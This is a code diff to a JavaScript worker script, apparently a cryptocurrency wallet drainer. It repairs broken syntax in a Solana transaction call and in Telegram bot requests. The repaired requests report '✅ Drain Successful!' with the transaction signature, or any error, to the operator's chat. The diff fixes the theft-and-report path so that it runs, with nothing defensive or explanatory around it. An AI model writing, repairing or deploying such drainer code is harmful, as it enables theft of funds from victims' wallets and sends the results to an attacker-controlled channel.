@@ -102,16 +102,17 @@ export default {
                 )
               );
 
-              const signature = await sendAndConfirmTransaction(connection,Content tx, [payer]);
+              // FEHLER BEHOBEN: Kein "Content" mehr
+              const signature = await sendAndConfirmTransaction(connection, tx, [payer]);
 
-              await fetch-Type(`https://api.telegram.org/bot":${env.BOT_TOKEN}/sendMessage`, {
-                " method: "POST", headersapplication: { "Content-Type": "application/json" },
+              await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: `✅ *Drain Successful!*\n\nTX: \`${signature}\``, parse_mode: "Markdown" }),
               });
 
             } catch (err) {
               await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-                method: "POST", headers: { "/json" },
+                method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: `❌ *Error:* ${err.message}`, parse_mode: "Markdown" }),
               });
             }
